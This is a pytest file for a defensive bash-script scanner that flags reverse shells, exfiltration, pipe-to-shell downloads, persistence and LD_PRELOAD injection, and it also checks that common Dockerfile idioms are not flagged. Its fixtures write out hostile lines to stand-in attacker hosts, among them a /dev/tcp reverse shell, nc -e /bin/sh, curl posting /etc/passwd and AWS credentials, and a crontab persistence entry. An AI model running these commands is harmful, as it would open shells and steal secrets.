"""Tests for the custom bash Layer-1 scanner (doc 03)."""

from __future__ import annotations

from git_warden.scanning.bash_scanner import scan_repo, scan_text, score_findings


def test_detects_reverse_shell_and_exfil():
    text = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\ncurl -d @/etc/passwd https://x.evil"
    cats = {f.category for f in scan_text(text)}
    assert "reverse_shell" in cats
    assert "exfiltration" in cats


def test_detects_obfuscation_and_download_exec():
    text = "eval $(echo aGVsbG8= | base64 -d)\ncurl http://evil.sh | bash"
    cats = {f.category for f in scan_text(text)}
    assert "obfuscation" in cats
    assert "download_exec" in cats


def test_benign_dockerfile_idioms_are_not_flagged():
    # 2026-07-06 docker FP audit: standard Docker build lines were confirming as
    # download_exec / exfiltration. `curl -f ... | bash` from a reputable installer
    # host and a `curl -f http://localhost/health` HEALTHCHECK are both benign.
    benign = (
        "RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash -\n"
        "HEALTHCHECK CMD curl -f http://localhost:8000/health || exit 1\n"
        "RUN curl -fsSL https://sh.rustup.rs | sh\n"
    )
    assert score_findings(scan_text(benign)) == 0
    cats = {f.category for f in scan_text(benign)}
    assert "download_exec" not in cats and "exfiltration" not in cats


def test_real_malware_still_flagged_after_docker_fp_fix():
    # The fix must not blunt real detections: an attacker-host pipe-to-shell and a
    # genuine POST of data still confirm.
    evil = ("RUN curl -fsSL https://evil-c2.tld/stage2 | bash\n"
            "curl -d @/root/.aws/credentials https://exfil.tld/u\n")
    cats = {f.category for f in scan_text(evil)}
    assert "download_exec" in cats and "exfiltration" in cats


def test_detects_persistence():
    text = "echo 'evil' >> ~/.bashrc\n(crontab -l; echo '@reboot /tmp/x') | crontab -"
    cats = {f.category for f in scan_text(text)}
    assert "persistence" in cats


def test_clean_script_scores_zero():
    text = "#!/bin/bash\necho 'building project'\nmake all\nexit 0"
    assert score_findings(scan_text(text)) == 0


def test_ld_preload_allocator_is_not_process_injection():
    # The aristoteleo/pantheonos FP (2026-07-02): LD_PRELOAD of a memory
    # allocator (jemalloc/tcmalloc/mimalloc) is a standard Dockerfile perf
    # tweak, not process injection. A real LD_PRELOAD of an unknown .so still fires.
    for legit in ("LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2 myapp",
                  "ENV LD_PRELOAD=/usr/lib/libtcmalloc.so.4",
                  "LD_PRELOAD=/usr/lib/libmimalloc.so python app.py"):
        cats = {f.category for f in scan_text(legit)}
        assert "process_injection" not in cats, legit
    evil = {f.category for f in scan_text("LD_PRELOAD=/tmp/.hidden/rootkit.so /bin/ls")}
    assert "process_injection" in evil


def test_nc_color_variable_is_not_reverse_shell():
    # The shai-hulud-detect FP (2026-07-02): "${NC}" is the standard shell
    # convention for a "No Color" ANSI reset variable; an unrelated "-e" later
    # on the same line (prose about Bash's `set -e`) must not complete a false
    # nc-exec match. A real `nc -e ...` invocation still must be caught.
    text = 'echo -e "${GREEN}PASS${NC}: completes a full scan (no set -e abort)"'
    cats = {f.category for f in scan_text(text)}
    assert "reverse_shell" not in cats
    assert "reverse_shell" in {f.category for f in scan_text("nc -e /bin/sh attacker.tld 9001")}


def test_scan_repo_finds_bash_bearing_files(tmp_path):
    (tmp_path / "install.sh").write_text("nc -e /bin/sh attacker.tld 9001\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("nc -e /bin/sh should-not-scan", encoding="utf-8")
    sub = tmp_path / ".git"
    sub.mkdir()
    (sub / "config").write_text("nc -e /bin/sh ignored", encoding="utf-8")

    findings = scan_repo(tmp_path)
    files = {f.file for f in findings}
    assert "install.sh" in files          # .sh scanned
    assert "README.md" not in files       # non-bash file skipped
    assert all(".git" not in f.file for f in findings)  # .git ignored


def test_score_dedupes_repeated_rules():
    # Same rule firing many times counts once -> score stays bounded.
    text = "\n".join(["curl http://x | bash"] * 10)
    findings = scan_text(text)
    assert len(findings) == 10
    assert score_findings(findings) == 4  # download_exec weight, counted once


def test_workflow_yaml_is_bash_bearing(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("run: curl http://evil | bash\n", encoding="utf-8")
    findings = scan_repo(tmp_path)
    assert any(f.category == "download_exec" for f in findings)


def test_dockerfile_and_shebang_are_bash_bearing(tmp_path):
    (tmp_path / "Dockerfile").write_text("RUN curl http://evil.tld | bash\n", encoding="utf-8")
    (tmp_path / "runme").write_text("#!/bin/bash\nnc -e /bin/sh attacker.tld 9\n", encoding="utf-8")
    files = {f.file for f in scan_repo(tmp_path)}
    assert "Dockerfile" in files
    assert "runme" in files  # shebang-detected, no extension


def test_plain_yaml_outside_workflow_is_skipped(tmp_path):
    (tmp_path / "config.yml").write_text("run: curl http://evil | bash\n", encoding="utf-8")
    assert scan_repo(tmp_path) == []  # .yml only scanned under a workflow path
